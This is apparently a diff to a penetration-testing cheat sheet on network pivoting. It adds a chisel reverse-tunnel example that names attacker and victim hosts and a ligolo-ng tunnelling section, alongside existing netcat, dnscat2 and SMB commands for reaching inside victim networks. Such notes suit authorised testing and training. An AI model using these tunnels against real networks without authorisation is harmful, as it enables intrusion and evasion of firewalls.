@@ -186,6 +186,7 @@ The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.
 
 Typing `help` in ad hoc command line mode shows command syntax examples.
 
+
 ### 8.1.2 SSH on Windows
 
 SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.
@@ -306,6 +307,7 @@ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' vict
 sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
 ```
 
+
 ## 8.4 Bending with socat
 
 On the jump-box:
@@ -348,6 +350,7 @@ Other useful addresses:
  - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
  - `PIPE` or `PIPE:filename`
 
+
 ## 8.5 Bending with netcat
 
 Netcat combined lets you do traffic bending. It's a crude (but effective) tool.
@@ -369,6 +372,7 @@ mkfifo /tmp/bp  # backpipe
 nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 # 'tee' lets you inspect bytes on the wire
 ```
+
 
 ## 8.6 Bending with iptables
 
@@ -405,7 +409,6 @@ sudo service iptables-persistent save
 ```
 
 
-
 ## 8.7 Bending with rinetd
 
 Better suited for **long-term** redirections.
@@ -419,6 +422,7 @@ bindaddress bindport connectaddress connectport
 ```
 
 The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file `/var/run/rinetd.pid` to facilitate the `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
+
 
 ## 8.8 Bending with netsh on Windows
 
@@ -452,6 +456,7 @@ sudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP
 netsh advfirewall firewall delete rule name="derp"
 ```
 
+
 ## 8.9 Bending with chisel
 
 [Chisel](https://github.com/jpillora/chisel) lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.
@@ -479,6 +484,9 @@ The most common way to use it is as a Reverse SOCKS proxy (reference: [Reverse S
 # add the following to the previous command:
 R:2222:VICTIM_IP:22
 
+# example
+chisel client SERVER_ATTACKER_IP:SERVER_ATTACKER_PORT R:PORT_ATTACKER:VICTIM_IP:VICTIM_PORT
+
 # to tunnel ssh through a SOCKS proxy without proxychains:
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP
 ```
@@ -499,19 +507,25 @@ dnscat2-server mydomain.com
 # on your DNS Nameserver, in the dnscat2 command shell:
 # list active sessions (windows)
 dnscat2> windows
+
 # interact with window/session 1
 dnscat2> window -i 1
+
 # get help, listing all commands
 command (victim01) 1> ? # or 'help'
+
 # get command help for 'listen' (sets up local fwd like ssh -L)
 command (victim01) 1> listen --help
+
 # start local port forwarding
 command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
+
 # if you mess up and have to change the listening port,
 # you have to kill the client and restart it.
 # It's usually better to just pick a different listen port if you can.
 # return to main command screen
 command (victim01) 1> shutdown
+
 # (after restarting victim client, you can retry your port forward)
 # if you want to return to the top level command window
 # without killing the client:
@@ -522,4 +536,36 @@ command (victim01) 1> suspend
 # now you can use your newly forwarded port to reach inside the victim network:
 smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
 # connection will be very slow.
+```
+
+
+## 8.11 Bending with `ligolo`
+
+[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).
+
+```sh
+# create interface
+sudo ip tuntap add user asdf mode tun IFACE_NAME
+
+# up interface
+sudo ip link set IFACE_NAME up
+
+# create route through new interface
+sudo ip ro add 10.x.x.x/24 dev IFACE_NAME
+
+## server
+# start
+./proxy -selfcert
+
+# show sessions
+session
+
+# start tunneling
+start
+
+## client
+# run client
+agent -connect IP:11601 -ignore-cert
+agent.exe -connect IP:11601 -ignore-cert
+
 ```
